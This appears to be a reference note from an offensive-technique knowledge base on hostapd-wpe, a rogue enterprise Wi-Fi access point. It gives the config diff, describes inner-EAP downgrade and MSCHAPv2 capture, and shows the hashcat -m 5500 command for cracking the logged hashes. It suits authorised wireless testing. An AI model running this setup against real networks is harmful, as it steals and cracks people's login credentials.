# hostapd-wpe — Wireless Pwnage Edition

A patch series on top of hostapd that adds **inner-EAP logging**:
MSCHAPv2 challenge/response captured, EAP-GTC plaintext captured,
PEAP inner-method downgrade knobs, cert phishing hooks.

## What WPE adds

- **Inner-method downgrade behavior** — the WPE variant of hostapd
  accepts inner-method downgrade offers from clients even when they
  requested a stronger inner method. Clients with weak cert
  validation get pushed onto MSCHAPv2 (or worse, GTC). (eaphammer
  exposes this as `--negotiate weakest`; hostapd-wpe's config-file
  `eap_user` list drives the equivalent behavior.)
- **Challenge/response logging** — every captured MSCHAPv2 exchange
  is written to `/var/log/hostapd-wpe.log` in a format that both
  `asleap` and `hashcat -m 5500` accept as input.
- **Cert bundle** — WPE ships a default self-signed CA / server-cert
  pair; regenerate for your engagement.

## Config diff vs stock hostapd

```
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
```

`hostapd-wpe.eap_user` accepts every user + any inner method by
default — the point is to log what the client sends.

## Log format for hashcat

```
$ tail -f /var/log/hostapd-wpe.log
username: alice
challenge: 5e:9d:...
response:  a7:82:...
jtr NETNTLM:  alice:$NETNTLM$5e9d...$a782...
hashcat NETNTLMv1: alice::::5e9d...:a782...
```

The `hashcat NETNTLMv1` line goes straight into a file that
`hashcat -m 5500 hashfile rockyou.txt` cracks.

## When to reach for WPE vs eaphammer

- **WPE** — you already run hostapd, want minimal delta, know your
  target's client behavior.
- **eaphammer** — you want cert templating, portal hosting, and
  multiple attack profiles ready to go.

## Cite

- hostapd-wpe GitHub (OpenSecurityResearch).
- attacks.json: `rogue-radius-hostapd-wpe`.
